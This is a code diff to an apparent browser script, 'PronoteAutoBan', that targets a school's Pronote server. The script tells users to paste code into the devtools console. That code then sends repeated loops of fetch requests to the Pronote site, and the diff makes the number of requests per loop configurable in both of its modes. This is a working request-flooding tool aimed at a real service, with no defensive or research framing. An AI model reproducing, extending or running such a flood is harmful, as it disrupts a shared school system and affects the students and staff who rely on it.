@@ -38,7 +38,7 @@ function AutomatedModeGUI() {
       alert("When activating automated mode, you will need to open devtools using the F12 key, enter Console, paste the text that will be copied to clipboard and press enter. You can then let the page run in background.");
       alert("You can stop the script by either closing the Pronote tab or by clicking the Stop automated mode button on this page (which will close the Pronote tab).");
       alert("A new Pronote tab will be opened. Make sure to permanently enable popups to automatically open the window !");
-      var textToCopy = userExecutedFunctions["automatedMode"];
+      var textToCopy = userExecutedFunctions["automatedMode"].replace("requestNumber", requestNumber);
       copyText(textToCopy, true);
       PronoteAutoBanWindow = window.open("https://" + EtabPrefix + ".index-education.net/pronote");
     } else {
@@ -57,7 +57,7 @@ function AutomatedModeGUI() {
                   console.log('Continuing the loop.');
                 } else {
                   console.log('Launching requests. Relaunching the loop.');
-                  for (var i = 0; i < 1000; i++) {
+                  for (var i = 0; i < requestNumber; i++) {
                     fetch('https://' + EtabPrefix + '.index-education.net/pronote/', {
                       mode: 'no-cors'
                     });
@@ -88,7 +88,8 @@ if (EtabPrefix.length === 8) {
       alert("When activating automated mode, you will need to open devtools using the F12 key, enter Console, paste the text that will be copied to clipboard and press enter. You can then let the page run in background.");
       alert("You can stop the script by either closing the Pronote tab or by clicking the Stop automated mode button on this page (which will close the Pronote tab).");
       alert("A new Pronote tab will be opened. Make sure to permanently enable popups to automatically open the window !");
-      var textToCopy = userExecutedFunctions["automatedModeNotify"];
+      var textToCopy = userExecutedFunctions["automatedModeNotify"].replace("requestNumber", requestNumber);
+      
       copyText(textToCopy, true);
       PronoteAutoBanNotifyWindow = window.open("https://" + EtabPrefix + ".index-education.net/pronote")
     } else {
@@ -111,7 +112,7 @@ if (EtabPrefix.length === 8) {
                 } else {
                   console.log('Launching requests. Relaunching the loop.');
                   PronoteUnbannedNotify();
-                  for (var i = 0; i < 1000; i++) {
+                  for (var i = 0; i < requestNumber; i++) {
                     fetch('https://' + EtabPrefix + '.index-education.net/pronote/', {
                       mode: 'no-cors'
                     });
